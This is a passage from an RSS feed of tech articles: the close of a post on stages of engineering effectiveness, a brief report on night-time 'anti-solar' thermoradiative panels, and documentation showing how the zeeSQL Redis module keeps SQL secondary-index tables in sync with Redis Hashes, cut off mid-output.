<li>Directors/mid-level managers set goals for their sub-orgs and monitor their metrics for early signs of issues.</li>
<li>First-line managers provide root-cause analysis on the specific factors contributing to high-level metrics.</li>
<li>Every engineering OKR includes goals around effectiveness and improvement.</li>
</ol>
<p>Before stage 4, engineering teams often aim to measure everything. In stage 4, they aim more precisely at high-value metrics like engineer utilization, <a href="https://www.okayhq.com/blog/engineering-productivity-can-be-measured" rel="nofollow noopener noreferrer" target="_blank">blockers</a>, and work-life balance. Stage 4 brings the ability for an org to diagnose specific symptoms all the way down to their root causes, where they can form coherent, data-backed stories that inform pinpointed improvements. The most successful stage 4 teams will even start uncovering personalized metrics that they find particularly correlate to their success.</p>
<p><strong>By combining automated, real-time metrics with the culture of continuous improvement built in stages 1-3, stage 4 teams can evolve their effectiveness into an always-running, well-oiled improvement machine.</strong></p>
<h2 id="stage-5-engineering-effectiveness-as-a-strategic-advantage">Stage 5: Engineering Effectiveness as a Strategic Advantage</h2>
<p><strong>Stage 5 turns engineering effectiveness into a strategic lever that helps the company achieve precise business goals.</strong></p>
<p>Even though a typical stage 5 team will contain hundreds or thousands of engineers all around the world, the best stage 5 orgs run like a well-coordinated symphony: individual contributions come together to create a single unit that's much more than the sum of its parts.</p>
<p>On top of stage 4's software-based measurement and org-wide culture of improvement, stage 5 adds a strategic lens. The best stage 5 organizations can make calculated risks involving conscious trade-offs. Perhaps the org extrapolates a concerning quality trend and adjusts its features long before engineers or customers start to complain. The best stage 5 organizations can calculate specific risk levels and readjust without unpleasant surprises.</p>
<p>High-performing stage 5 teams typically engage in:</p>
<ul>
<li>Industry/peer-group <a href="https://dealstruck.com/resources/the-power-of-peer-benchmarking/" rel="nofollow noopener noreferrer" target="_blank">benchmarking</a> (to understand their effectiveness compared to other companies)</li>
<li>Automatic implementation of the latest effectiveness research (to accelerate constant improvement)</li>
<li>Anticipatory activities at every stage in the org (to predict potential problems before they arise)Â&nbsp;</li>
<li>Thought leadership on new best practices of engineering effectiveness (naturally uncovered as a result of their experience)Â&nbsp;</li>
<li>Full transparency/understanding of engineering metrics, even outside of the engineering org (to aid company-wide improvement)</li>
<li>Calculated risks (to achieve precise business aims)</li>
</ul>
<p>From the outside, a stage 5 team looks like a strong engineering brand. It can accelerate and adjust, attract top talent while achieving business aims.</p>
<h2 id="toward-engineering-effectiveness">Toward Engineering EffectivenessÂ&nbsp;</h2>
<p>Engineering effectiveness is too expensive to be left to chance. Start by assessing where your team currently is. Are you:Â&nbsp;</p>
<ul>
<li>Sufficiently small that metrics are still a "nice to have"?</li>
<li>Data-curious and ready to react?</li>
<li>In need of a dedicated effectiveness team?</li>
<li>Positioned to produce a continuously improving organizationÂ&nbsp;?</li>
<li>Able to precisely tune your priorities to enable the company's long-term strategy?</li>
</ul>
<p><strong>Then, solidify your position at your current stage, building a solid foundation on which you can expand.</strong></p>
<p>While every engineering team has its own individual nuance, most will follow this consistent evolution. We uncovered these stages through years of observation, but there's still more improvement to be applied to engineering.</p>
<p>We've made it our mission to improve engineering effectiveness. If you've uncovered your own trends or if you're curious for more, <a href="https://okayhq.typeform.com/to/O47Fx3Q7" rel="nofollow noopener noreferrer" target="_blank">let us know</a>. We'd love to improve engineering effectiveness for everyone.</p></div></div></div>]]>
            </description>
            <link>https://www.okayhq.com/blog/the-5-stages-of-engineering-effectiveness</link>
            <guid isPermaLink="false">hacker-news-small-sites-26229974</guid>
            <pubDate>Mon, 22 Feb 2021 20:16:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anti-Solar Panels May Generate Power at Night Soon]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26229635">thread link</a>) | @elorant
<br/>
February 22, 2021 | https://robologiclab.com/anti-solar-panels-may-generate-power-at-night-soon/ | <a href="https://web.archive.org/web/*/https://robologiclab.com/anti-solar-panels-may-generate-power-at-night-soon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><article id="post-2010"><p><a href="https://robologiclab.com/wp-content/uploads/2021/02/Untitled-design-14.png"><img width="800" height="445" src="https://i0.wp.com/robologiclab.com/wp-content/uploads/2021/02/Untitled-design-14.png?resize=800%2C445&amp;ssl=1" alt="Anti-solar panels that can work round the clock!" loading="lazy"></a></p><div><div><p>Have anyone told you that a solar panel can be operational at the night? This might sound like an unrealistic tech. However, it is possible and in the future, we can see solar panels working at night also. The University of California (UC), Davis scientists are inventing a prototype for an ‘anti-solar panels’ that would work opposite to a classic solar panel. The new studies suggest that it is possible that such panels could work round the clock.</p><p><br>These anti-solar panels can produce a quarter of the energy they generate throughout the day under ideal conditions. The scientist reveals the requirement to combine thermoradiative panels that could produce energy on account of radiative cooling. In radiative cooling due to thermal radiation, a body dissipates out its heat. The thermoradiative cells are used for the experiment for manufacturing. After that, they transfigure the heat into electricity.</p><figure><img loading="lazy" width="800" height="391" src="https://i1.wp.com/robologiclab.com/wp-content/uploads/2021/02/Untitled-design-15.png?resize=800%2C391&amp;ssl=1" alt="anti-solar panels installed on building" srcset="https://i1.wp.com/robologiclab.com/wp-content/uploads/2021/02/Untitled-design-15.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/robologiclab.com/wp-content/uploads/2021/02/Untitled-design-15.png?resize=300%2C146&amp;ssl=1 300w, https://i1.wp.com/robologiclab.com/wp-content/uploads/2021/02/Untitled-design-15.png?resize=768%2C375&amp;ssl=1 768w" sizes="(max-width: 800px) 100vw, 800px" data-recalc-dims="1"></figure><h3>Research Behind Anti-Solar Panels</h3><p>ACS Photonics publication has published a research paper. In this paper, the scientists have revealed how they developed the anti-solar cells. Which perform their function of radiative cooling. Some engineers from UC states were puzzled concerning what would be the result if they installed one of the solar panels in a warm area, and pointed it towards the sky. It tends to concentrate on visible light to give rise to efficacious cells that could use the night sky and space as a heat sink. Jeremy Munday, an electrical and computer engineer from UC states mention that physics was identical in both the tech, only the materials are varying.</p><p><br>However this technology is in its initial phases, the team is in the middle of developing prototypes. The important point about this research is, it can be made economical to hold solar panels functional for a day. Last but not the least, according to scientists the enigmatic space is an interesting, comparatively unexplored area. However, it can assist and deliver electrical power at night and day with the proper utilization of materials science, optics, and photonics.</p><p><br>Hope you all like it, please share your valuable views about this tech in the comment section. Thank you for reading this!</p></div></div></article></div></div>]]>
            </description>
            <link>https://robologiclab.com/anti-solar-panels-may-generate-power-at-night-soon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26229635</guid>
            <pubDate>Mon, 22 Feb 2021 19:51:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to query Redis via SQL using zeeSQL, a Redis module]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26229236">thread link</a>) | @siscia
<br/>
February 22, 2021 | https://doc.zeesql.com/secondary-indexes | <a href="https://web.archive.org/web/*/https://doc.zeesql.com/secondary-indexes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div data-editioncontainer="true"><div data-slate-editor="true" data-key="99d575d5d9494774b58e94c134875bfe" autocorrect="on" spellcheck="true" data-gramm="false"><p data-key="d132604706b74d1ea3b25f8c061f4698"><span><span data-key="92a3e1259d634aed98244d185476416e"><span data-offset-key="92a3e1259d634aed98244d185476416e:0">Redis, at his heart, is a key-value store. It makes it simple, easy, and fast to search for values given their keys.</span></span></span></p><p data-key="158bbb9376024a42b42f72277517cdc2"><span><span data-key="1a340560a7a444c7829f7870dff5fbe4"><span data-offset-key="1a340560a7a444c7829f7870dff5fbe4:0">Often time, however, is necessary to look for keys that values respect some properties.</span></span></span></p><p data-key="c4eddb73b340409384e2e8e1e515c01d"><span><span data-key="7163d6925bcb47d0ac9767e557d84301"><span data-offset-key="7163d6925bcb47d0ac9767e557d84301:0">For instance, find all the keys for which their value is greater than 5. Or the keys that have a value set to a specific string like "admin".</span></span></span></p><p data-key="a57a4b331849426995249c2e86882646"><span><span data-key="29e8065c6aed4fc8a98681a8b8adc4d1"><span data-offset-key="29e8065c6aed4fc8a98681a8b8adc4d1:0">The standard solution for this problem in Redis is to keep a set of secondary indexes. To keep everything in sync, those secondary indexes need to be updated along with the primary keys. Keeping the indexes in sync is an activity that the developer who uses Redis need to take care of, and it brings a sizable increment in complexity.</span></span></span></p><p data-key="a15e489be47f4f2ab6c166a0cc2553c6"><span><span data-key="a04138aab73d4c729e004fa1428b6123"><span data-offset-key="a04138aab73d4c729e004fa1428b6123:0">zeeSQL aims to solve this problem.</span></span></span></p><p data-key="e69cead577704775abcf60ef86692363"><span><span data-key="7e48e1d5dbd246daa508bf67d7e16123"><span data-offset-key="7e48e1d5dbd246daa508bf67d7e16123:0">Redis provides different data structures, one of them is Redis Hashes.</span></span></span></p><p data-key="28fd527b5ccd4acfb9c28a2238f877dd"><span><span data-key="e66ee6d8f91a4870a014a02a10271292"><span data-offset-key="e66ee6d8f91a4870a014a02a10271292:0">Redis Hashes map between string fields and string values. From the Redis documentation:</span></span></span></p><div><pre data-key="e727dbc8c0c74893a7cbef256ec0fe19" spellcheck="false"><p><span data-key="9fa2a5987271478d848a7f2ff0a8c130"><span data-offset-key="9fa2a5987271478d848a7f2ff0a8c130:0">HMSET user:1000 username antirez password P1pp0 age 34</span></span></p><p><span data-key="185065f64f634d63aa80bbf0817da560"><span data-offset-key="185065f64f634d63aa80bbf0817da560:0">HGETALL user:1000</span></span></p><p><span data-key="8b5975dc3f0a4d0ea01d88396524dce8"><span data-offset-key="8b5975dc3f0a4d0ea01d88396524dce8:0">HSET user:1000 password 12345</span></span></p><p><span data-key="790b5c40bc4f4097bf1a166dd5fb445a"><span data-offset-key="790b5c40bc4f4097bf1a166dd5fb445a:0">HGETALL user:1000</span></span></p></pre></div><p data-key="12460737540a4efbbb1828c8717d0b19"><span><span data-key="22f81201ba524c00aecb5369874d052d"><span data-offset-key="22f81201ba524c00aecb5369874d052d:0">In this case to the Redis key </span><span data-offset-key="22f81201ba524c00aecb5369874d052d:1"><code spellcheck="false" data-slate-leaf="true">user:1000</code></span><span data-offset-key="22f81201ba524c00aecb5369874d052d:2"> we associate a Redis Hash.</span></span></span></p><p data-key="87d4ded7c0de4661bb2d87df394e98a7"><span><span data-key="fcf98200d882403a815332a34784b4a4"><span data-offset-key="fcf98200d882403a815332a34784b4a4:0">The Redis Hash has 3 fields, </span><span data-offset-key="fcf98200d882403a815332a34784b4a4:1"><code spellcheck="false" data-slate-leaf="true">username</code></span><span data-offset-key="fcf98200d882403a815332a34784b4a4:2"> with value </span><span data-offset-key="fcf98200d882403a815332a34784b4a4:3"><code spellcheck="false" data-slate-leaf="true">antirez</code></span><span data-offset-key="fcf98200d882403a815332a34784b4a4:4">, </span><span data-offset-key="fcf98200d882403a815332a34784b4a4:5"><code spellcheck="false" data-slate-leaf="true">password</code></span><span data-offset-key="fcf98200d882403a815332a34784b4a4:6"> with value </span><span data-offset-key="fcf98200d882403a815332a34784b4a4:7"><code spellcheck="false" data-slate-leaf="true">P1pp0</code></span><span data-offset-key="fcf98200d882403a815332a34784b4a4:8">, and </span><span data-offset-key="fcf98200d882403a815332a34784b4a4:9"><code spellcheck="false" data-slate-leaf="true">age</code></span><span data-offset-key="fcf98200d882403a815332a34784b4a4:10"> with value 34.</span></span></span></p><p data-key="5475b74c117e4caeba11958805f72e5a"><span><span data-key="ee0c87558d7f4f2db88359d6b285b250"><span data-offset-key="ee0c87558d7f4f2db88359d6b285b250:0">Redis Hashes are the only data structure that can be indexed using zeeSQL.</span></span></span></p><p data-key="64a9a9c28d85441caef8e8fc89f23207"><span><span data-key="bd45e40eb9434dfa9319f03381a9838c"><span data-offset-key="bd45e40eb9434dfa9319f03381a9838c:0">At the moment, zeeSQL we can index only Redis Hashes.</span></span></span></p><p data-key="ca16762639a74544b7ba06e013913ec4"><span><span data-key="937db6eec8834eefb9aa6d0edd6a95eb"><span data-offset-key="937db6eec8834eefb9aa6d0edd6a95eb:0">Secondary indexes in zeeSQL are standard SQL tables.</span></span></span></p><p data-key="9be38e637b6544419899eed4413a33ab"><span><span data-key="893752348fee4d3589ca476cbed3a3b7"><span data-offset-key="893752348fee4d3589ca476cbed3a3b7:0">The user needs to provide the schema of the table, and zeeSQL will automatically keep the table in sync with the Redis Hashes.</span></span></span></p><p data-key="dacfbdbbba6544af9ae937ac8de12716"><span><span data-key="aed8a12590ad45d9b96a41fd631efba7"><span data-offset-key="aed8a12590ad45d9b96a41fd631efba7:0">The user can also provide a prefix so that only some Redis Hashes, the ones that match the prefix, are stored in the secondary index.</span></span></span></p><p data-key="359df7cfa882466fa5b0bb18937799b2"><span><span data-key="76f79e9f7a27404791887f294e83371d"><span data-offset-key="76f79e9f7a27404791887f294e83371d:0">A secondary table can be created using the </span></span><a data-key="0212751be50b49b7996149199a8cd356" href="https://doc.zeesql.com/references#zeesql-index-new"><span data-key="9d51723b405a47429ecf3138dc43806d"><span data-offset-key="9d51723b405a47429ecf3138dc43806d:0"><code spellcheck="false" data-slate-leaf="true">ZEESQL.INDEX</code></span><span data-offset-key="9d51723b405a47429ecf3138dc43806d:1"> command</span></span></a><span data-key="4c87c85c88ad47ed9caf7f4a0580b92a"><span data-offset-key="4c87c85c88ad47ed9caf7f4a0580b92a:0">.</span></span></span></p><div><pre data-key="f99dc9840cc94f1e9414c3ac898164dc" spellcheck="false"><p><span data-key="754c14eba8d84b92acd99bbec5112ec5"><span data-offset-key="754c14eba8d84b92acd99bbec5112ec5:0">&gt; ZEESQL.INDEX DB NEW TABLE $table_name [PREFIX prefix] SCHEMA column_name column_type [column_name column_type]</span></span></p></pre></div><p data-key="314d2dcb0c4b444aa2c79052e01f2030"><span><span data-key="132c88c57f7d4843b43250f5b8387619"><span data-offset-key="132c88c57f7d4843b43250f5b8387619:0">This command will perform two actions.</span></span></span></p><p data-key="fda10d1526c04c6faba3b9f54ec29ac9"><span><span data-key="61f44b7f5b7d40ee8b8312d39a669e2b"><span data-offset-key="61f44b7f5b7d40ee8b8312d39a669e2b:0">At first, it will try to create a table called </span><span data-offset-key="61f44b7f5b7d40ee8b8312d39a669e2b:1"><code spellcheck="false" data-slate-leaf="true">$table_name</code></span><span data-offset-key="61f44b7f5b7d40ee8b8312d39a669e2b:2">. If the table already exists, this step is skipped. If the table does not exists, the new table is created with the columns indicated after the </span><span data-offset-key="61f44b7f5b7d40ee8b8312d39a669e2b:3"><code spellcheck="false" data-slate-leaf="true">SCHEMA</code></span><span data-offset-key="61f44b7f5b7d40ee8b8312d39a669e2b:4"> keyword.</span></span></span></p><p data-key="47af357c11ff44188c01cffc1152f546"><span><span data-key="4eaf5aaf7425410c82475ff6efcc40d3"><span data-offset-key="4eaf5aaf7425410c82475ff6efcc40d3:0">After the table is created, we register a callback.</span></span></span></p><p data-key="8bf415d3defa48538d5fcd8451de2994"><span><span data-key="b558fe36d9344c5996dc05e1fd157872"><span data-offset-key="b558fe36d9344c5996dc05e1fd157872:0">The callback, listen to all the events that happen to the keys that start with the prefix, if the prefix is omitted, the callback listen to events for all the keys.</span></span></span></p><p data-key="17aa06b905594bc6ac626b4c9b0d7b9c"><span><span data-key="b4d6c8d83a724cdda14e8daa4bcfd201"><span data-offset-key="b4d6c8d83a724cdda14e8daa4bcfd201:0">The callback is invoked passing as arguments the type of event and against which key the event was fired. From there, the callback has all the information it needs to keep the secondary index table in sync.</span></span></span></p><p data-key="e0f9b1dcb0ae40079e77f1011ade6168"><span><span data-key="d5f0cf23fe7c445fb51e4a9637559446"><span data-offset-key="d5f0cf23fe7c445fb51e4a9637559446:0">Every time that one key, matching the prefix is modified, zeeSQL updates the secondary index table.</span></span></span></p><p data-key="6eb4a89280474b87a248eb3c486d12f8"><span><span data-key="2c2f2fd3411f48ec8a9b07185723e9f0"><span data-offset-key="2c2f2fd3411f48ec8a9b07185723e9f0:0">The structure of the secondary index table is very simple.</span></span></span></p><p data-key="f6bd614c42f54565a3095522ef900ae6"><span><span data-key="081fe19251e54f08a5857845459b4997"><span data-offset-key="081fe19251e54f08a5857845459b4997:0">There is a primary key, which is always a string, which value is the Redis key itself. In the Redis Hash above, the primary key will be the value </span><span data-offset-key="081fe19251e54f08a5857845459b4997:1"><code spellcheck="false" data-slate-leaf="true">user:1000</code></span></span></span></p><p data-key="e73c5a4a9a3b4373aa2a83de07129368"><span><span data-key="c321103290b54dc8bf7e84f657dd68c6"><span data-offset-key="c321103290b54dc8bf7e84f657dd68c6:0">Next to the primary key, there are all the columns defined in the schema, with their respective types.</span></span></span></p><p data-key="aec474afa8bf45c9a585310fc333d86b"><span><span data-key="2c42f65323aa4c03b2a00674f460db25"><span data-offset-key="2c42f65323aa4c03b2a00674f460db25:0">The secondary index table is a standard SQLite table.</span></span></span></p><p data-key="cbcd8f9cb4b04c28a8388d6a34d0b729"><span><span data-key="f83673b66a1a431fa4f78523081749c3"><span data-offset-key="f83673b66a1a431fa4f78523081749c3:0">There is nothing special about it, besides being managed by zeeSQL itself and not by the user.</span></span></span></p><p data-key="6deb9fbe21714f6b983d9cf7d55b5d28"><span><span data-key="573157057fda4cd29c14af4972c6f312"><span data-offset-key="573157057fda4cd29c14af4972c6f312:0">You can, of course, query it, in whichever way you find more appropriate.</span></span></span></p><p data-key="2b6e3a0c57534feb9ed59be9a4149c97"><span><span data-key="86f60c3445af415e81b0e3a5d1680c18"><span data-offset-key="86f60c3445af415e81b0e3a5d1680c18:0">However, you could also modify it, even though it is strongly discouraged.</span></span></span></p><p data-key="4e616b1ed7c44925beabe8a5053224c0"><span><span data-key="bbfde2153f924a5f895f50fd09dbef2d"><span data-offset-key="bbfde2153f924a5f895f50fd09dbef2d:0">Being a standard SQLite table, it is possible to define indexes also on your secondary index table. This will allow even faster lookups.</span></span></span></p><p data-key="a7db498bed9c4cc19e162e17e8e940ec"><span><span data-key="28178cba5bab4f0d873a60ac013a3a19"><span data-offset-key="28178cba5bab4f0d873a60ac013a3a19:0">Moreover, it is also possible to define triggers.</span></span></span></p><p data-key="6cea82bff103467d96c58f8025529f67"><span><span data-key="fbba6c7b0bc941ccbab7ae3449b44384"><span data-offset-key="fbba6c7b0bc941ccbab7ae3449b44384:0">The commands to modify the secondary index tables, are fire and forget.</span></span></span></p><p data-key="ef2cba47e1fb405c955be609b13b8fa8"><span><span data-key="d46998e762aa435ea525a82253ead437"><span data-offset-key="d46998e762aa435ea525a82253ead437:0">The works seamlessly on a standard table without constraints. However, if you start to add constraints and triggers to the secondary index table, it will be your responsibility to keep the database in a consistent state.</span></span></span></p><p data-key="878d3cc55fdc43aeba702d441122e88f"><span><span data-key="5138c25fd150432cab41ca29ce338b53"><span data-offset-key="5138c25fd150432cab41ca29ce338b53:0">Unfortunately, zeeSQL cannot provide any feedback, if an update or insertion failed.</span></span></span></p><p data-key="dac5b23d29f14911b8d4c97e579a50e6"><span><span data-key="efcf40430f59451396cb1e20bb1c4e19"><span data-offset-key="efcf40430f59451396cb1e20bb1c4e19:0">The use cases when this could be a problem, are extremely advanced.</span></span></span></p><p data-key="12cd5f1060994b80844dc086002eb722"><span><span data-key="1560b692dd1945b9bdc9bc5b441ba392"><span data-offset-key="1560b692dd1945b9bdc9bc5b441ba392:0">In our Redis we can store users for a simple online game. Of those users we store a simple ID, the name, and the score.</span></span></span></p><p data-key="263425a855b04899bedd9cde6bcdfd0d"><span><span data-key="fa80727a413943e69c2124d3fdf0bebd"><span data-offset-key="fa80727a413943e69c2124d3fdf0bebd:0">We want to search for all the user who scores is greater than 5.</span></span></span></p><p data-key="a731f4d040774523873fd08c9988c9fa"><span><span data-key="e7ed305df25843c0925f4da6e39ca829"><span data-offset-key="e7ed305df25843c0925f4da6e39ca829:0">We start by creating a zeeSQL database.</span></span></span></p><div><pre data-key="cb07dd712eba4ecc8aea14dbe5368e80" spellcheck="false"><p><span data-key="1df92de0255149988aa7beea30a4cc2d"><span data-offset-key="1df92de0255149988aa7beea30a4cc2d:0">&gt; ZEESQL.CREATE_DB DB</span></span></p><p><span data-key="c01d6a62c0a146e7b1d1c5a1fb417b66"><span data-offset-key="c01d6a62c0a146e7b1d1c5a1fb417b66:0">1) 1) "OK"</span></span></p></pre></div><p data-key="1b87ea8c5e1b47ad94439b9a26cf9fbb"><span><span data-key="83113dcf59e5422a927db8c39e0d584a"><span data-offset-key="83113dcf59e5422a927db8c39e0d584a:0">Now we can start populating our users.</span></span></span></p><div><pre data-key="8b6a725dd39749bcb347cbcbc5229b56" spellcheck="false"><p><span data-key="733614247796406dbff15878ec561667"><span data-offset-key="733614247796406dbff15878ec561667:0">127.0.0.1:6379&gt; HMSET user:100 id 100 name foo score 3</span></span></p><p><span data-key="4749160ea0dc45508e1b6304e867b4ff"><span data-offset-key="4749160ea0dc45508e1b6304e867b4ff:0">OK</span></span></p><p><span data-key="fdb58d43ab9842f89bf59da94280410c"><span data-offset-key="fdb58d43ab9842f89bf59da94280410c:0">127.0.0.1:6379&gt; HMSET user:103 id 103 name bar score 5</span></span></p><p><span data-key="f9e36faf2d624c4d864693f24e5f38c8"><span data-offset-key="f9e36faf2d624c4d864693f24e5f38c8:0">OK</span></span></p><p><span data-key="1cf9666f262245d4b746c6256456a494"><span data-offset-key="1cf9666f262245d4b746c6256456a494:0">127.0.0.1:6379&gt; HMSET user:105 id 105 name baz score 4</span></span></p></pre></div><p data-key="c83c38c1348148ec9920d0a49580af39"><span><span data-key="76674fa98f884c59b4c38a1d3e411686"><span data-offset-key="76674fa98f884c59b4c38a1d3e411686:0">We have created 3 users, each with its own name, id, and score.</span></span></span></p><p data-key="e82d713b050e48bebc0cfb7d1bdae6cd"><span><span data-key="409fb70dfbff4221bb7891d1e86dcce5"><span data-offset-key="409fb70dfbff4221bb7891d1e86dcce5:0">At this point, we can create a secondary index.</span></span></span></p><div><pre data-key="910e48df5c534836882bad7976ddf27d" spellcheck="false"><p><span data-key="5b706f8519cb44f2b0da2e8a918bfe05"><span data-offset-key="5b706f8519cb44f2b0da2e8a918bfe05:0">127.0.0.1:6379&gt; ZEESQL.INDEX DB NEW PREFIX user:* TABLE users SCHEMA id INT name STRING score INT</span></span></p><p><span data-key="2d3ac6c506dc4280bf80132b05886e82"><span data-offset-key="2d3ac6c506dc4280bf80132b05886e82:0">OK</span></span></p></pre></div><p data-key="1abfa63fbae041c68513636a38e4440b"><span><span data-key="9e9444e2707d4875b2c3a277d12785a3"><span data-offset-key="9e9444e2707d4875b2c3a277d12785a3:0">Now we have created the secondary index table.</span></span></span></p><p data-key="c29a3778078c4e8981886fc36db04b78"><span><span data-key="0528eca5b45a4e36a5a6f68f0909ff08"><span data-offset-key="0528eca5b45a4e36a5a6f68f0909ff08:0">We can visualize what table was created by querying the </span><span data-offset-key="0528eca5b45a4e36a5a6f68f0909ff08:1"><code spellcheck="false" data-slate-leaf="true">sqlite_master</code></span><span data-offset-key="0528eca5b45a4e36a5a6f68f0909ff08:2"> special table.</span></span></span></p><div><pre data-key="6dbcded6cad9473ea5ea9a43025e4318" spellcheck="false"><p><span data-key="7b5d28eefec549749a4337aa69197a8c"><span data-offset-key="7b5d28eefec549749a4337aa69197a8c:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "select * from sqlite_master;"</span></span></p><p><span data-key="f9259fc9e9484284bb1fd95577ee35f5"><span data-offset-key="f9259fc9e9484284bb1fd95577ee35f5:0">1) 1) "RESULT"</span></span></p><p><span data-key="a2c2df4ff75e49359d415ee9f66b8a32"><span data-offset-key="a2c2df4ff75e49359d415ee9f66b8a32:0">2) 1) "type"</span></span></p><p><span data-key="89be74d7bc3e4638adb661f200ac37f4"><span data-offset-key="89be74d7bc3e4638adb661f200ac37f4:0">   2) "name"</span></span></p><p><span data-key="765a1ca9f1ee40ccadbddc3954797376"><span data-offset-key="765a1ca9f1ee40ccadbddc3954797376:0">   3) "tbl_name"</span></span></p><p><span data-key="373a7b02a7c34436bc58f95d9e5596c5"><span data-offset-key="373a7b02a7c34436bc58f95d9e5596c5:0">   4) "rootpage"</span></span></p><p><span data-key="7ec90ff23a214b97b0d20a44a4d1d282"><span data-offset-key="7ec90ff23a214b97b0d20a44a4d1d282:0">   5) "sql"</span></span></p><p><span data-key="e87490d6631a4ce29993829d847f230b"><span data-offset-key="e87490d6631a4ce29993829d847f230b:0">3) 1) "TEXT"</span></span></p><p><span data-key="9c24d4e4ab504abe88c664bf28ee271c"><span data-offset-key="9c24d4e4ab504abe88c664bf28ee271c:0">   2) "TEXT"</span></span></p><p><span data-key="1a3a160e456b4ae1822a08000955298b"><span data-offset-key="1a3a160e456b4ae1822a08000955298b:0">   3) "TEXT"</span></span></p><p><span data-key="b3c69febf9874191adebff0d667f2729"><span data-offset-key="b3c69febf9874191adebff0d667f2729:0">   4) "INT"</span></span></p><p><span data-key="6dc04a0b3ca44a23ac207c22f49fb4b9"><span data-offset-key="6dc04a0b3ca44a23ac207c22f49fb4b9:0">   5) "TEXT"</span></span></p><p><span data-key="8cfa7de313e2483391c9caef6aaf1764"><span data-offset-key="8cfa7de313e2483391c9caef6aaf1764:0">5) 1) "table"</span></span></p><p><span data-key="796a6deefc8147d1aefb2605b94fbe95"><span data-offset-key="796a6deefc8147d1aefb2605b94fbe95:0">   2) "users"</span></span></p><p><span data-key="f2fb9cc1644049afbf142b7df12fddd2"><span data-offset-key="f2fb9cc1644049afbf142b7df12fddd2:0">   3) "users"</span></span></p><p><span data-key="ed98f401d4944df6b48dea095d52ebbb"><span data-offset-key="ed98f401d4944df6b48dea095d52ebbb:0">   4) (integer) 3</span></span></p><p><span data-key="285492e07765451dbb8d879acf9b2383"><span data-offset-key="285492e07765451dbb8d879acf9b2383:0">   5) "CREATE TABLE users(key PRIMARY KEY, id INT, name STRING, score INT)"</span></span></p></pre></div><p data-key="be0d6ab0f183405190f73ddb1bb8e1a9"><span><span data-key="124307480bd440d8b34f4cd6013fa63f"><span data-offset-key="124307480bd440d8b34f4cd6013fa63f:0">Exactly what we would expect, the </span><span data-offset-key="124307480bd440d8b34f4cd6013fa63f:1"><code spellcheck="false" data-slate-leaf="true">key</code></span><span data-offset-key="124307480bd440d8b34f4cd6013fa63f:2"> column as primary key, where we will store the key of the Redis Hash, and then the schema we asked for.</span></span></span></p><p data-key="8a9833224b7a493fb312bebed9d24bf9"><span><span data-key="82dce88e84e44c12b3fbd2ccff00458f"><span data-offset-key="82dce88e84e44c12b3fbd2ccff00458f:0">Since the secondary index was created after some Redis Hashes were already inside Redis, the table is already populated.</span></span></span></p><div><pre data-key="b4d781b4e1f94042a2c682c1e8ddc731" spellcheck="false"><p><span data-key="7eb5181ef9924945ab57b7f3d1ba45d1"><span data-offset-key="7eb5181ef9924945ab57b7f3d1ba45d1:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "select * from users;"</span></span></p><p><span data-key="36f776e471a14deb9c71e2937cf32c6a"><span data-offset-key="36f776e471a14deb9c71e2937cf32c6a:0">1) 1) "RESULT"</span></span></p><p><span data-key="0d6b40acd6ee44e1a363f58feb4ea589"><span data-offset-key="0d6b40acd6ee44e1a363f58feb4ea589:0">2) 1) "key"</span></span></p><p><span data-key="01a97c64ed2846f4948cf857668a1250"><span data-offset-key="01a97c64ed2846f4948cf857668a1250:0">   2) "id"</span></span></p><p><span data-key="cb1529ba338d4883a9c0f9adf38313a7"><span data-offset-key="cb1529ba338d4883a9c0f9adf38313a7:0">   3) "name"</span></span></p><p><span data-key="48ddf0b693b74c539a772a116f00d024"><span data-offset-key="48ddf0b693b74c539a772a116f00d024:0">   4) "score"</span></span></p><p><span data-key="e6013b093e2c469da24fb58f81eea50d"><span data-offset-key="e6013b093e2c469da24fb58f81eea50d:0">3) 1) "TEXT"</span></span></p><p><span data-key="d75a1c6b155b4ce4b9a04bf63e2aac0e"><span data-offset-key="d75a1c6b155b4ce4b9a04bf63e2aac0e:0">   2) "INT"</span></span></p><p><span data-key="5bcfc3bff7844528a19e5719877cc37a"><span data-offset-key="5bcfc3bff7844528a19e5719877cc37a:0">   3) "TEXT"</span></span></p><p><span data-key="0ac46fddc2214670ac5acb3ff01d5738"><span data-offset-key="0ac46fddc2214670ac5acb3ff01d5738:0">   4) "INT"</span></span></p><p><span data-key="edfe48cc21024658874411b33ed54659"><span data-offset-key="edfe48cc21024658874411b33ed54659:0">4) 1) "user:105"</span></span></p><p><span data-key="21443b8d18474b9d8d0f0406f475c626"><span data-offset-key="21443b8d18474b9d8d0f0406f475c626:0">   2) (integer) 105</span></span></p><p><span data-key="cd1f0c36c8214387bf5ccf39a25edc78"><span data-offset-key="cd1f0c36c8214387bf5ccf39a25edc78:0">   3) "baz"</span></span></p><p><span data-key="7957011c160340569c719f2bab2607ad"><span data-offset-key="7957011c160340569c719f2bab2607ad:0">   4) (integer) 4</span></span></p><p><span data-key="d603aa26406044edbc631b7c24b99f8e"><span data-offset-key="d603aa26406044edbc631b7c24b99f8e:0">5) 1) "user:103"</span></span></p><p><span data-key="086f05920e5f4660ae55e26c64ae6ccd"><span data-offset-key="086f05920e5f4660ae55e26c64ae6ccd:0">   2) (integer) 103</span></span></p><p><span data-key="e2c87afa241b4eff9a724cf67cf4551a"><span data-offset-key="e2c87afa241b4eff9a724cf67cf4551a:0">   3) "bar"</span></span></p><p><span data-key="c606911f61634ab2a7644916bff8ed89"><span data-offset-key="c606911f61634ab2a7644916bff8ed89:0">   4) (integer) 5</span></span></p><p><span data-key="06525514d57b49c4a2dcfeae4e9a6ba9"><span data-offset-key="06525514d57b49c4a2dcfeae4e9a6ba9:0">6) 1) "user:100"</span></span></p><p><span data-key="57e1eb3e7c10429c980909d5f2dcddcb"><span data-offset-key="57e1eb3e7c10429c980909d5f2dcddcb:0">   2) (integer) 100</span></span></p><p><span 